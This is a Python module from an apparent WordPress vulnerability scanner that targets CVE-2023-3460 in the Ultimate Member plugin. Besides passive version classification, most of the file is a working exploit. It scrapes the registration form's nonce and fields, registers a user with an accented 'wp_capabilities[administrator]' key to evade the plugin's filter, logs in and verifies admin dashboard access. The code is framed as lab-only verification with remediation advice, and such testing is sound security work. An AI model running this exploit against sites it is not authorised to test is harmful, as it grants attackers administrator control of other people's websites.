from __future__ import annotations

import json
import re
import secrets
from typing import Any

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2023-3460"
NAME = "Ultimate Member unauthenticated privilege escalation"
COMPONENT = "WordPress plugin Ultimate Member"
AFFECTED_RULE = "Ultimate Member before 2.6.7"
PLUGIN_SLUG = "ultimate-member"
PATCHED_VERSION = "2.6.7"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
REGISTER_PATHS = ("/register/", "/index.php/register/", "/registration/", "/signup/")
# The plugin's banned-key check is a substring match.  MySQL's accent-insensitive
# collation stores and reads this key as wp_capabilities.
ESCALATION_FIELD = "wp_c\u00e0pabilities[administrator]"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required(PATCHED_VERSION) else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade Ultimate Member to 2.6.7 or newer and audit recently created privileged accounts.",
        exploit_available=HAS_EXPLOIT,
    )


def _input_value(html: str, name: str) -> str | None:
    pattern = (
        rf'name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']*)["\']'
        rf'|value=["\']([^"\']*)["\'][^>]*name=["\']{re.escape(name)}["\']'
    )
    match = re.search(pattern, html, re.IGNORECASE)
    if not match:
        return None
    return match.group(1) if match.group(1) is not None else match.group(2)


def _form_details(html: str) -> dict[str, str] | None:
    nonce = _input_value(html, "_wpnonce")
    form_id = _input_value(html, "form_id")
    if form_id is None:
        match = re.search(r'id=["\']form_id_([0-9]+)["\']', html, re.IGNORECASE)
        form_id = match.group(1) if match else None
    if not nonce or not form_id:
        return None

    def field(name: str) -> str:
        return _input_value(html, f"{name}-{form_id}") or f"{name}-{form_id}"

    return {
        "nonce": nonce,
        "form_id": form_id,
        "login": field("user_login"),
        "email": field("user_email"),
        "password": field("user_password"),
        "confirm": field("confirm_user_password"),
        "first": field("first_name"),
        "last": field("last_name"),
    }


def _candidate_registration_paths(sess: HttpSession) -> list[str]:
    paths = list(REGISTER_PATHS)
    rest_paths = (
        "/wp-json/wp/v2/pages?slug=register&per_page=1",
        "/?rest_route=/wp/v2/pages&slug=register&per_page=1",
    )
    pages: list[Any] = []
    for rest_path in rest_paths:
        response = sess.get(rest_path, timeout=8)
        if response.get("status") != 200:
            continue
        try:
            parsed = json.loads(response.get("body", "[]"))
        except (json.JSONDecodeError, TypeError):
            continue
        if isinstance(parsed, list):
            pages = parsed
            break
    for page in pages:
        if not isinstance(page, dict):
            continue
        link = page.get("link")
        if isinstance(link, str) and link:
            paths.append(link)
        page_id = page.get("id")
        if isinstance(page_id, int):
            paths.append(f"/?page_id={page_id}")
    return paths


def _find_registration_form(sess: HttpSession) -> tuple[str, dict[str, str]] | None:
    seen: set[str] = set()
    for path in _candidate_registration_paths(sess):
        if path in seen:
            continue
        seen.add(path)
        response = sess.get(path, timeout=8)
        if is_transport_error(response):
            continue
        body = str(response.get("body", ""))
        if response.get("status") != 200 or 'data-mode="register"' not in body:
            continue
        details = _form_details(body)
        if details:
            return path, details
    return None


def _proof_url(base: str, path: str) -> str:
    return path if path.startswith(("http://", "https://")) else f"{base}{path}"


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    found = _find_registration_form(sess)
    if not found:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="No Ultimate Member registration form was reachable at the standard public paths.",
            action="Manually verify the registration page and upgrade Ultimate Member to 2.6.7 or newer.",
        )

    register_path, form = found
    suffix = secrets.token_hex(4)
    username = f"pocum{suffix}"
    password = f"Proofcms!{secrets.token_hex(6)}"
    email = f"{username}@example.test"
    fields = {
        form["login"]: username,
        form["first"]: "Proof",
        form["last"]: "Admin",
        form["email"]: email,
        form["password"]: password,
        form["confirm"]: password,
        "form_id": form["form_id"],
        "um_request": "",
        "_wpnonce": form["nonce"],
        "_wp_http_referer": register_path,
        ESCALATION_FIELD: "1",
    }

    register = sess.post(register_path, fields=fields)
    if is_transport_error(register):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=f"Registration request could not obtain an HTTP response ({transport_error_detail(register)}).",
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    register_body = str(register.get("body", ""))
    login = sess.post(
        "/wp-login.php",
        fields={
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": "/wp-admin/",
            "testcookie": "1",
        },
    )
    admin = sess.get("/wp-admin/")
    users = sess.get("/wp-admin/users.php")
    admin_body = str(admin.get("body", ""))
    users_body = str(users.get("body", ""))
    admin_ok = admin.get("status") == 200 and "Dashboard" in admin_body
    users_ok = users.get("status") == 200 and (
        "Add New User" in users_body or "user-new.php" in users_body
    )
    registered = any(
        marker in register_body.lower()
        for marker in ("successfully", "account has been created", "registration complete")
    )

    evidence = {
        "created_username": username,
        "registration_page": _proof_url(base, register_path),
        "registration_status": register.get("status", 0),
        "login_status": login.get("status", 0),
        "admin_dashboard": admin_ok,
        "admin_users_page": users_ok,
        "escalation_field": ESCALATION_FIELD,
    }

    if admin_ok and users_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=_proof_url(base, register_path),
            detail=(
                "Unauthenticated registration with the accented wp_capabilities key created an account "
                f"({username}) that can access the administrator dashboard and users page."
            ),
            action=(
                f"Delete the account {username}, audit administrator accounts, and upgrade Ultimate Member "
                f"to {PATCHED_VERSION} or newer."
            ),
            evidence=evidence,
        )

    if registered or admin_ok:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=_proof_url(base, register_path),
            detail=(
                "The registration request was accepted, but administrator access was not verified. "
                f"Created username: {username}."
            ),
            action=(
                f"If the account exists, delete {username}. Upgrade Ultimate Member to {PATCHED_VERSION} or newer."
            ),
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        proof_url=_proof_url(base, register_path),
        detail="The crafted registration request did not create an administrator account.",
        action=f"Upgrade Ultimate Member to {PATCHED_VERSION} or newer and review registration settings.",
        evidence=evidence,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE requires aggressive lab-only registration verification."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Aggressive proof skipped because Ultimate Member was not detected as potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": ["<2.6.7"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2023-3460",
            "https://www.wordfence.com/blog/2023/06/psa-unpatched-critical-privilege-escalation-vulnerability-in-ultimate-member-plugin-being-actively-exploited/",
            "https://www.exploit-db.com/exploits/52393",
        ],
    }
